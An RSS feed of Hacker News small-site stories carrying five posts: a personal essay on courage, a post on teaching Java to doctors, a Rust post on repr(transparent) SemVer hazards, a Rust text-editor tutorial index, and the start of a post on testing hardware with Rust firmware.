<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 19 Jan 2021 05:09:43 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 19 Jan 2021 05:09:43 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[People that think you‚Äôre an asshole]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25809346">thread link</a>) | @LeonW
<br/>
January 17, 2021 | https://leowid.com/the-people-that-think-youre-an-asshole/ | <a href="https://web.archive.org/web/*/https://leowid.com/the-people-that-think-youre-an-asshole/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <header>    
                
            </header>

            <section>
            <div>
                <div><p>‚ÄúThe people that think you‚Äôre an asshole, they already think that about you now, Leo! You might as well do what you want anyway.‚Äù This Is what my friend Ed told me when I shared with him my fears about telling some grueling stories in my upcoming book. And what people might think about me when they read it and what I‚Äôve done so far in my life. Strangely that was a huge relief.</p>
<p>On the other hand, if they don‚Äôt think so negatively about me as I‚Äôd projected when they find out about another ‚Äúouting‚Äù, it‚Äôll probably bring us closer together. In a way, it‚Äôs a win-win.</p>
<p><a href="https://leowid.com/the-6-practices-that-influenced-my-life-the-most-over-the-past-5-years/">Radical honesty</a> is a bitch, I‚Äôm learning. It hurts so bad at times but also frees me so much.</p>
<p>I‚Äôve since mentioned this phrase of his several times with friends and in coaching sessions in various ways: those people that you think don‚Äôt like you, they already don‚Äôt like you now. Whether you do the thing or not.</p>
<p>What this leads to is courage. Courage is the thing we find when we give up on needing to be liked. Even for a brief moment. Then we are free to do what we want to do because we want to do it. This is real freedom.</p>
<p>It‚Äôs crushing and disappointing that we can‚Äôt stay there in that state of freedom. That we retreat again after a while into the darkness and the need to be liked and wanted. That‚Äôs ok, that‚Äôs life. From there, we garner and ripen the courage yet again to go out there and not care for what others think of us.</p>
<p>Along the way, we might make some friends that encourage us in this process and that back and forth. But it‚Äôs really not necessary to be too harsh on ourselves when we realize none of these states are permanent.</p>
<p>‚ÄúCheer up! You can‚Äôt blame anyone else for the kind of world that you‚Äôre in. And if you know that ‚ÄúI‚Äù, in the sense of the person, the front, the ego, it really doesn‚Äôt exist. Then it won‚Äôt go to your head to badly if you wake up and discover that you‚Äôre god.‚Äù is what Alan watts said, which I feel belongs here.</p>
<p>So go out there. And don‚Äôt worry about the people you fear think of you as an asshole, they already do that now anyway. You might as well take my friend Ed‚Äôs advice and do your thing regardless. Good luck and I‚Äôm here if I can help.</p>
</div>
            </div>
        </section><section>
                <div>
                    <p><img data-src="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg" data-srcset="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg 400w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-300x300.jpg 300w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-150x150.jpg 150w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-180x180.jpg 180w" data-sizes="(max-width: 100px) 100vw, 100px" alt="" src="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg" srcset="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg 400w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-300x300.jpg 300w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-150x150.jpg 150w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-180x180.jpg 180w">
                        <span>Leo Widrich</span>
                        <span>Leo Widrich coaches extraordinary people. In his previous life, he co-founded Buffer, a $20m+ revenue software company. He also lived in Buddhist monasteries for close to two years, trained as a trauma therapist and now lives in Vienna near the forest. He tweets <a href="https://twitter.com/LeoWid">@leowid</a>. To learn about working with him, <a href="https://leowid.com/working-with-me/">go here</a>.</span>
                    </p>
                </div>
            </section><section>
        <div>
            <div><h3>Receive my most vulnerable and powerful lessons from meeting life.</h3><p>Add your details below for my weekly newsletter.</p></div>
        </div>
    </section>
        </div></div>]]>
            </description>
            <link>https://leowid.com/the-people-that-think-youre-an-asshole/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809346</guid>
            <pubDate>Sun, 17 Jan 2021 09:13:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why teaching programming is so difficult?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809333">thread link</a>) | @rukshn
<br/>
January 17, 2021 | https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Like I said in one of my previous posts, I just started my first semester in my <a href="https://ruky.me/2020/12/23/what-is-health-informatics-and-what-i-do-for-a-living/" data-type="post" data-id="85">MSc in health informatics</a>. And the first semester has a module for object oriented programming.</p>
<h2>Some history</h2>
<p>I was lucky to learn computers since I was 10 years old, even though computers were mostly used in offices and even though my parents didn‚Äôt have much knowledge in computers, they sent me to a class where they taught the basics in computing.</p>
<p>After some basics in computers, we were fist taught MS Basic, as a 11 year old, basic was an easy to understand language, me and my friends experimented in creating new programmes and it was all fun.</p>
<p>Then as the years went on we learned Pascal, C++, Visual Basic and JAVA. By 14-15 I created some interesting programs with Visual Basic and .NET. Every Saturday me and my friends at the computer class showed off to each other what they have created during the week. It was a fun time.</p>
<p>As a 15 year old one thing I failed to grasp was object oriented programming, yes I knew how to use Visual Basic, but it took me some more time to really understand the scope of Object Oriented Programming.</p>
<h2>Me trying to teach programming to doctors</h2>
<p>I went to become a doctor, but even at medical college I never lost my touch in programming, and curiosity to learn new things. I learned JavaScript, frameworks like Angular, Vue, React, and now I‚Äôm more interested in web technologies.</p>
<p>Fast forward 15 years later, I‚Äôm learning basics in Object Oriented Programming again, as a post graduate student in health informatics.</p>
<p>Even though I‚Äôm also a newbie in networking and software engineering (I never liked hardware and networking side of things as a child), because I have learned the basics of programming, I feel object oriented programming and JAVA lessons as something that comes natural to me.</p>
<p>However, the same cannot be said to some of my colleagues, whom they have not learned programming or basics in computing when they were young. This is their first time in learning object oriented programming, JAVA. Almost everyone is more than 30 years old, and some of them turn to me to explain them how to get though their JAVA assignments.</p>
<p>I constantly repeat them the fact that,</p>
<blockquote><p><strong>Don‚Äôt learn java, don‚Äôt try to memorise the java syntax, learn the principals of object oriented programming, and programming. Once you learn the concepts, you will be able to apply that to any OOP language and crate whatever you want.</strong></p></blockquote>
<p>However, they constantly find it difficult to grasp the concepts object oriented programming, and in return they also find it difficult to learn java or any other language.</p>
<p>And when I try to explain, or ‚Äú<em>try to</em> <em>teach</em> them‚Äù Java they always find it difficult to understand</p>
<ul><li>What is a function/method?</li><li>What is meant by return?</li><li>What is an array? What is an index? </li><li>Why looping is so hard to understand?</li><li>What is the meaning of <em>public stat</em>ic void main()</li></ul>
<p>There are some of the usual questions I get to answer but still no matter how hard I explained to them, they always find it difficult to understand it.</p>
<h2>Why teaching programming is so difficult?</h2>
<ul><li>Maybe I‚Äôm not a good teacher</li><li>Maybe I‚Äôm trying to explain to them in a position where I‚Äôm subconsciously explaining to them thinking they also had some basic knowledge in computing when they were children.</li><li>It is a known fact that with age you lose the ability to learn new skills, is due to their age which makes it difficult for them to understand programming?</li><li>Is it because they straightaway had to go to Java instead of learning a simpler language first, like what I did as a child?</li><li>Since they are doctors I don‚Äôt think they lack the analitical capabilities in understanding the logics behind programming. </li></ul>
<p>So what makes it so difficult for them to understand programming?</p>
<h2>What should I do to make them like programming, and learn the basics in object oriented programming?</h2>
<p>I tried everything possible, </p>
<ul><li>I explained to them as simple as I can</li><li>I showed them some articles available online</li><li>I wrote some easy to understand posts by my self and emailed to them</li><li>I showed them some YouTube videos that explains object oriented programming and java </li></ul>
<p>But none of them seems to work and I don‚Äôt see a good progress in any of them.</p>
<p>What do you recommend that I should to to make them learn programming basics and JAVA? The last option is to create some basic lessons coupled with some simple exercises for them to do, instead of somewhat complex assignments given to them by the MSc program.</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809333</guid>
            <pubDate>Sun, 17 Jan 2021 09:10:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust's SemVer Snares: `Repr(transparent)` Super-Cut]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809318">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://jack.wrenn.fyi/blog/semver-snares-transparent/ | <a href="https://web.archive.org/web/*/https://jack.wrenn.fyi/blog/semver-snares-transparent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><a href="https://jack.wrenn.fyi/blog/semver-snares"><em>(Part of an ongoing series!)</em></a></p>
<p>In the last two posts, <code>repr(transparent)</code> provided an unusual mechanism by which safe, downstream code could inadvertently rely on the <a href="https://jack.wrenn.fyi/blog/semver-snares-size/">size</a> and <a href="https://jack.wrenn.fyi/blog/semver-snares-alignment/">alignment</a> of an upstream type. In this post, I'll recap the issue and discuss why it is tricky to fix.</p>
<p>To recap, <code>repr(transparent)</code> attribute provides a mechanism for observing the alignment of a type. The <code>repr(transparent)</code> attribute can be applied to types where:</p>
<ul>
<li>at most one field has size greater-than zero, and</li>
<li>all <em>other</em> fields have minimum alignment equal to 1</li>
</ul>
<p>...to specify that the annotated type's layout is identical to that of the non-zero-sized field.</p>
<p>Applying <code>repr(transparent)</code> to a type with more than one field of size ‚â•1 is a compile error:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: </span><span>u8</span><span>, </span><span>// size = 1
    </span><span>baz</span><span>: </span><span>u8  </span><span>// size = 1 (‚ö†)
</span><span>}
</span></code></pre>
<p>...as is applying <code>repr(transparent)</code> to a type with more than one field having alignment &gt;1:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: </span><span>u8</span><span>,      </span><span>// align = 1
    </span><span>baz</span><span>: [</span><span>u16</span><span>; 0] </span><span>// align = 2 (‚ö†)
</span><span>}
</span></code></pre>
<p><strong>At present, you should not use <code>#[repr(transparent)]</code> unless you are sure your ZST fields are <em>guaranteed</em> to have size equal to zero, and alignment equal to one.</strong></p>
<p>What would it take to fully shift this diligence from the programmer to the compiler?</p>
<h2 id="potentially-breaking-changes">Potentially-Breaking Changes</h2>
<p>To answer this, let's consider the sorts of (otherwise) non-breaking changes that can increase the alignment and size of ZSTs.</p>
<h3 id="repr-annotations"><code>repr</code> Annotations</h3>
<p>Applying a <code>repr</code> annotation to a type can alter its size and alignment. The <code>align(N)</code> modifier specifies that the annotated type will have a minimum alignment of at least <code>N</code>:</p>
<pre><code data-lang="rust"><span>// uncommenting this line breaks `Bar`:
/* #[repr(align(2))] */
</span><span>struct </span><span>Foo;

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre>
<p>Adding <code>repr(C)</code> or <code>repr(&lt;primitive&gt;)</code> to an ZST <code>enum</code> can increase its size:</p>
<pre><code data-lang="rust"><span>// uncommenting this line breaks `Bar`:
/* #[repr(isize)] */
</span><span>enum </span><span>Foo {
  Variant
}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre><h3 id="fields">Fields</h3>
<p>Generally speaking, it is not a breaking change to:</p>
<ul>
<li>modify or remove private fields</li>
<li>add private fields to structs marked with <code>#[non_exhaustive]</code></li>
<li>add private fields to structs that already have private fields</li>
</ul>
<p>...but, in the presence of <code>repr(transparent)</code>, all of the above changes can potentially break downstream code.</p>
<p>The minimum alignment of <code>repr(C)</code> and <code>repr(transparent)</code> types is equal to the greatest minimum alignment of its fields. Adding a &gt;1-aligned field to a 1-aligned ZST prohibits that ZST from use as a field in a <code>repr(transparent)</code> type:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: [</span><span>u8</span><span>; 0], </span><span>// align == 1
    // uncommenting this field breaks `Bar`:
    /* baz: [u16; 0], */ // align == 2
</span><span>}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre>
<p>Likewise, adding or modifying a field of a ZST such that the size increases in a breaking change:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: (),
    </span><span>// uncommenting this field breaks `Bar`:
    /* baz: u8 */
</span><span>}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre><h3 id="type-parameters">Type Parameters</h3>
<p>As type parameters provide a mechanism for consumers to alter the private, internal details of a type, <em>changes</em> to how type parameters are instantiated directly effect the alignment of a type:</p>
<pre><code data-lang="rust"><span>/// `Foo` is *always* a ZST, but its alignment is equal to that of `T` 
</span><span>#[</span><span>repr</span><span>(C)] </span><span>struct </span><span>Foo&lt;T&gt;([T; 0]);

assert_eq!(</span><span>0</span><span>, size_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>0</span><span>, size_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());

assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>2</span><span>, align_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());
</span></code></pre>
<p>...and the size of a type:</p>
<pre><code data-lang="rust"><span>/// `Foo` is 1-aligned, but has the size of `T`
</span><span>#[</span><span>repr</span><span>(C, packed)] </span><span>struct </span><span>Foo&lt;T&gt;(MaybeUninit&lt;T&gt;);

assert_eq!(</span><span>1</span><span>, size_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>2</span><span>, size_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());

assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u8</span><span>&gt;&gt;());
assert_eq!(</span><span>1</span><span>, align_of::&lt;Foo&lt;</span><span>u16</span><span>&gt;&gt;());
</span></code></pre>
<p>Consequently, Rust must usually assume that generically-instantiated fields are <em>not</em> one-aligned ZSTs:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Foo&lt;T, U&gt;(T, [U; 0]);
</span></code></pre><pre><code><span>error<a href="https://doc.rust-lang.org/nightly/error-index.html#E0690" target="_blank">[E0690]</a>: transparent struct needs exactly one non-zero-sized field, but has 2</span>
 <a href="#" data-line="2" data-col="1">--&gt; src/lib.rs:2:1
</a>  |
2 | struct Foo&lt;T, U&gt;(T, [U; 0]);
  | ^^^^^^^^^^^^^^^^^-^^------^^
  | |                |  |
  | |                |  this field is non-zero-sized
  | |                this field is non-zero-sized
  | needs exactly one non-zero-sized field, but has 2
</code></pre>
<p>This error is necessary if one wants to provide <em>definition-site</em> errors for <code>repr(transparent)</code> violations.</p>
<h3 id="const-parameters">Const Parameters</h3>
<p>Unsurprisingly, the instantiation of a const-generic parameter can affect the size of a type:</p>
<pre><code data-lang="rust"><span>/// the alignment of `Foo&lt;N&gt;` is 1
/// the size of `Foo&lt;N&gt;` is `N` bytes
</span><span>#[</span><span>repr</span><span>(C)]
</span><span>struct </span><span>Foo&lt;</span><span>const</span><span> N: </span><span>usize</span><span>&gt;([</span><span>u8</span><span>; N]);
</span></code></pre>
<p>The instantiation of const-generic parameters can also affect the alignment of a type:</p>
<pre><code data-lang="rust"><span>use </span><span>std::mem::align_of;

</span><span>/// alignment of `ZST&lt;{N}&gt;` is equal to `N`
/// the size of `ZST&lt;{N}&gt;` is equal to 0.
</span><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>ZST&lt;</span><span>const</span><span> N: </span><span>usize</span><span>&gt;
where
    (): Align&lt;{N}</span><span>&gt;</span><span>,
{
    align: [</span><span>&lt;</span><span>() </span><span>as </span><span>Align&lt;{N}</span><span>&gt;&gt;</span><span>::Type; </span><span>0</span><span>],
}

assert_eq!(</span><span>1</span><span>, align_of::&lt;ZST&lt;1&gt;&gt;());
assert_eq!(</span><span>2</span><span>, align_of::&lt;ZST&lt;2&gt;&gt;());

</span><span>pub trait </span><span>Align&lt;const N: usize&gt; { </span><span>type </span><span>Type; }
#[</span><span>repr</span><span>(</span><span>align</span><span>(1)</span><span>)] </span><span>pub struct </span><span>Align1;
#[</span><span>repr</span><span>(</span><span>align</span><span>(2)</span><span>)] </span><span>pub struct </span><span>Align2;
</span><span>/* and so on */
</span><span>impl </span><span>Align&lt;{1}&gt; </span><span>for</span><span> () { </span><span>type </span><span>Type </span><span>=</span><span> Align1; }
</span><span>impl </span><span>Align&lt;{2}&gt; </span><span>for</span><span> () { </span><span>type </span><span>Type </span><span>=</span><span> Align2; }
</span><span>/* and so on */
</span></code></pre><h3 id="default-repr-and-rustc-version">Default <code>repr</code> and <code>rustc</code> Version</h3>
<p>Generally speaking, the layout properties of "default repr" (i.e., a type without a <code>repr</code> attribute) are <em>unspecified</em>. To my knowledge, it is not currently specified that:</p>
<pre><code data-lang="rust"><span>enum </span><span>Foo {
  Bar
}
</span></code></pre>
<p>is guaranteed to be a one-aligned and zero-sized. Although <code>Foo</code> may be laid out as such by <em>particular</em> versions of Rust (such as the version available at the time of writing), that may not be true for <em>future</em> versions of Rust. This is a deeper issue than just SemVer stability.</p>
<h2 id="enforcing-semver-stability">Enforcing SemVer Stability</h2>
<p>At the time of writing, there is <a href="https://github.com/rust-lang/rust/issues/78586">some effort to eliminate</a> the stability hazards of <code>repr(transparent)</code>. However, to <em>comprehensively</em> enforce that uses of <code>#[repr(transparent)]</code> are SemVer-respecting at type definition sites in this manner, <code>rustc</code> would need implement all of the following restrictions atop the basic well-formedness check:</p>
<ol>
<li>prohibit, on all but one field, most occurences of type parameters</li>
<li>prohibit, on all but one field, most occurences of const parameters</li>
<li>require, on all but one field, that field types are fully-implicitly constructible</li>
<li>require, on all but one field, that field types have well-specified sizes and alignments</li>
<li>document that changing the <code>repr</code> of <em>any</em> one-aligned ZST is a SemVer Breaking Change‚Ñ¢</li>
</ol>
<p>These requirements have far-reaching implications for the role of layout and <code>repr</code> in SemVer stability. Since these adjustments would likely need to be timed with an edition change anyways, it's worth considering if a simpler formulation of <code>repr(transparent)</code> exists. I think there is: limit <code>repr(transparent)</code> to structs on which at most one field is <em>not</em> <code>PhantomData</code>.</p>
<h2 id="beyond-repr-transparent">Beyond <code>repr(transparent)</code></h2>
<p>SemVer aside, <code>repr(transparent)</code>'s restrictions on generic parameters are complex and unwieldy. These restrictions are necessary to ensure, <strong>at definition site</strong>, that <em>any</em> instantiation of the annotated type will be transparent with respect to its non-one-aligned-ZST field. But, in the future, <code>repr(transparent)</code> may not be necessary at all as a layout modifier (merely as a definition-site check).</p>
<p>The Unsafe Code Working Group <a href="https://github.com/rust-lang/unsafe-code-guidelines/pull/164">proposes</a> that one-aligned-ZST fields shalt not influence the layout of default-<code>repr</code> structs, and that default-<code>repr</code> structs with exactly one <em>non</em>-one-aligned-ZST field shall have layout identical to that of the field. If accepted, these rules would mean that one could determine whether or not a particular type was <em>effectively</em> transparent, even in the absence of <code>repr(transparent)</code>. What would be missing is an in-language mechanism to double-check. To this end, I'd suggest the introduction of the compiler-intrinsic trait <code>mem::AbiEq&lt;Other&gt;</code>, which is implemented for all types whose ABI is identical to <code>Other</code>.</p>

  </div></div>]]>
            </description>
            <link>https://jack.wrenn.fyi/blog/semver-snares-transparent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809318</guid>
            <pubDate>Sun, 17 Jan 2021 09:07:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hecto: Build your own text editor in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25809288">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://www.philippflenker.com/hecto/ | <a href="https://web.archive.org/web/*/https://www.philippflenker.com/hecto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <p><a href="https://www.philippflenker.com/hecto-chapter-1/">First chapter</a> - <a href="https://www.philippflenker.com/hecto-appendices/">Appendices</a> - <a href="https://www.philippflenker.com/hecto-chapter-7/">Last chapter</a></p>

<p>This is a series of blog posts that shows you how to
build a text editor in Rust. It‚Äôs a re-implementation of
<a href="http://antirez.com/news/108">kilo</a> in Rust, as outlined in <a href="https://viewsourcecode.org/snaptoken/kilo/index.html">this fantastic
tutorial</a>. Same as the
original booklet, these blog posts guide you through all the steps to build a
basic text editor, <code>hecto</code>.</p>

<p>You will almost always be able to see your changes in action by applying the
changes, saving and running the program. I will explain every step along the way
as best as I can - sometimes in great detail, and often linking to other pages.
Feel free to skim over the prose and ignore the links, there is plenty to learn
just by applying the code changes and watching your text editor grow!</p>

<h2 id="why">Why?</h2>
<p>I have always thought that every software engineer needs to have more than
superficial knowledge of at least two programming languages. However, I have to
admit, that in the past few years, my knowledge in pretty much everything except
JavaScript has started to fade.</p>

<p>That‚Äôs why I started to learn Rust, and I have re-implemented <code>kilo</code> as a
learning experience. But <em>why</em>? In order to learn Rust, I wanted ro re-implement
a well-understood piece of software, so that I could focus on the language
without getting lost in the implementation details. But I did not want to
re-implement stuff I used JavaScript for, as I think that JavaScript is designed
for a different problem space than Rust. Or in other words: If you are a
plumber, you best learn how to use an axe by using it to chop down some trees,
and not to unclog a sink.</p>

<p><code>kilo</code> is complex enough to pose a challenge, and when I read it, I wished it
was available for Rust - and now it is!</p>

<p>And <em>why</em> the name? <code>hecto</code> follows more modest goals than <code>kilo</code>. It does not
aim to be small, and it wasn‚Äôt even my own idea - so it seemed appropriate to
give it a more modest name than its spiritual predecessor.</p>

<h2 id="license">License</h2>
<ul>
  <li><code>kilo</code> was distributed under the <a href="https://opensource.org/licenses/BSD-2-Clause">BSD-2 Clause
License</a></li>
  <li>The <a href="https://viewsourcecode.org/snaptoken/kilo/">original tutorial</a> was
distributed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></li>
  <li><code>hecto</code> and this tutorial are licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY
4.0</a></li>
</ul>

<h3 id="indication-of-changes">Indication of Changes</h3>
<p>While these blog posts are based firmly on the <a href="https://viewsourcecode.org/snaptoken/kilo/index.html">original
tutorial</a>, the code has
been adapted to Rust, not only by calling the closest ‚Äúrust counterpart
function‚Äù, but by trying to solve things ‚Äúthe rust way‚Äù. Similarily, all
explanations have been checked and revised, and in many cases heavily rewritten,
in the context of Rust. Therefore, this tutorial should be seen as a ‚Äúrust
remix‚Äù of the original <code>C</code> version.</p>

<h2 id="feedback">Feedback</h2>
<p>I‚Äôm happy that you read my work and would love to <a href="https://www.philippflenker.com/about">hear from you</a> - especially if you are either stuck or have found a
better way to solve specific things. Keep in mind that this is mostly an
exercise for me to get to know Rust - so if there‚Äôs a better way to do things,
<a href="https://www.philippflenker.com/about">please reach out</a>!</p>

<h2 id="table-of-contents">Table of Contents</h2>
<ol>
  <li><a href="https://www.philippflenker.com/hecto-chapter-1/">Setup</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-2/">Reading User Input</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-3/">Raw User Input and Output</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-4/">A Text Viewer</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-5/">A Text Editor</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-6/">Search</a></li>
  <li><a href="https://www.philippflenker.com/hecto-chapter-7/">Syntax Highlighting</a></li>
</ol>

<ul>
  <li><a href="https://www.philippflenker.com/hecto-appendices/">Appendices</a></li>
</ul>

  </div></div>]]>
            </description>
            <link>https://www.philippflenker.com/hecto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809288</guid>
            <pubDate>Sun, 17 Jan 2021 09:00:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing Hardware Using Rust]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809208">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://www.jaredwolff.com/testing-hardware-using-rust/ | <a href="https://web.archive.org/web/*/https://www.jaredwolff.com/testing-hardware-using-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img alt="nRF9160 Feather Test CLI" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/Screen_Shot_2021-01-06_at_10.30.55_AM.png" data-src="images/Screen_Shot_2021-01-06_at_10.30.55_AM.png"></p><p>Rust has grown on me over the past year. I consumed <a href="https://doc.rust-lang.org/stable/book/" target="_blank">The Book</a> while on a plane ride in February of last year <em>right</em> before Covid hit. It has basically been all downhill since. üòÖ</p><p>Since then, i‚Äôve designed a (very alpha) <a href="https://github.com/jaredwolff/eagle-plm" target="_blank">CLI based MRP system</a>, e-commerce backend for <a href="https://www.jaredwolff.com/store/" target="_blank">my static website</a>, CLI based tester and firmware for my nRF9160 Feather test fixture. Yea, all in Rust.</p><p>In this article, i‚Äôll be sharing details about how I developed the CLI and ATSAMD based tester for the <a href="https://www.jaredwolff.com/store/nrf9160-feather/" target="_blank">nRF9160 Feather</a>. By the end this should give you confidence that you can also develop your own firmware and software 100% in Rust!</p><p>Let‚Äôs get started.</p><h2 id="sprinkle-some-rust-in-your-firmware">Sprinkle some Rust in your firmware</h2><p><img alt="nRF9160 Feather tester hardware render" src="https://www.jaredwolff.com/testing-hardware-using-rust/images/feather-tester_v14.png" data-src="images/feather-tester_v14.png"></p><p>As mentioned earlier, I designed my tester hardware (pictured above) to use an ATSAMD microcontroller. I had a few reasons why I chose the ATSAMD21:</p><ol><li>It has a <strong>ton</strong> of pins. (ATSAMD21J18A-MFT has 52 to be exact!) This was going to be important in order to connect to and control everything about the DUT (Device under test) in the tester.</li><li>SAMD21 series is also ubiquitous and plentiful elsewhere. It also happens to have great support in the form of the <code>atsamd-hal</code> crate. (<a href="https://github.com/atsamd-rs/atsamd" target="_blank">Link</a>)</li></ol><p>While there is some test firmware on the DUT itself, there‚Äôs a bunch of exciting stuff happening on the tester side. But before we do, let‚Äôs chat about the bootloader.</p><h3 id="first-thing-you-should-do">First thing you should do</h3><p>After lots of tinkering I realized that one of the first things you should do on any SAMD based project is get the UF2 bootloader loaded. Since loading it onto my test board <strong>I haven‚Äôt used my debug probe.</strong> (Rust makes this extremely easy since it eliminates 80% of the stupid mistakes i‚Äôd otherwise make in C)</p><p>Here‚Äôs a quick primer on how I got my board working:</p><ol><li><p>I cloned the UF2 repo:</p><div><pre><code data-lang="bash">git clone https://github.com/microsoft/uf2-samdx1
</code></pre></div></li><li><p>Created a folder called <code>circuitdojo_feather_tester</code> within the <code>boards</code> directory.</p><div><pre><code data-lang="bash">cd uf2-samdx1
mkdir boards/circuitdojo_feather_tester
</code></pre></div></li><li><p>I created <code>board.mk</code> and <code>board_config.h</code></p><div><pre><code data-lang="bash">cd boards/circuitdojo_feather_tester
touch board.mk
touch board_config.h
</code></pre></div></li><li><p>Using the already existing boards in the <code>boards</code> folder, updated the contents of <code>http://board.mk</code> and <code>board_config.h</code>. First <code>board.mk</code> to define what chip I was targeting:</p><div><pre><code data-lang="c">CHIP_FAMILY <span>=</span> samd21
CHIP_VARIANT <span>=</span> SAMD21J18A
</code></pre></div><p>Then <code>board_config.h</code> for all the configuration bits:</p><div><pre><code data-lang="c"><span>#ifndef BOARD_CONFIG_H
</span><span>#define BOARD_CONFIG_H
</span><span></span>
<span>#define VENDOR_NAME "Circuit Dojo"
</span><span>#define PRODUCT_NAME "Feather Tester"
</span><span>#define VOLUME_LABEL "BOOT"
</span><span>#define INDEX_URL "https:</span><span>//www.jaredwolff.com/"
</span><span></span><span>#define BOARD_ID "SAMD21G18A-Feather-v0"
</span><span></span>
<span>#define USB_VID 0x16c0
</span><span>#define USB_PID 0x27dd
</span><span></span>
<span>#define LED_PIN PIN_PA22
</span><span></span>
<span>#endi
</span></code></pre></div></li><li><p>Then using the instructions in the Readme, build the code:</p><div><pre><code data-lang="bash">make BOARD<span>=</span>circuitdojo_feather_tester
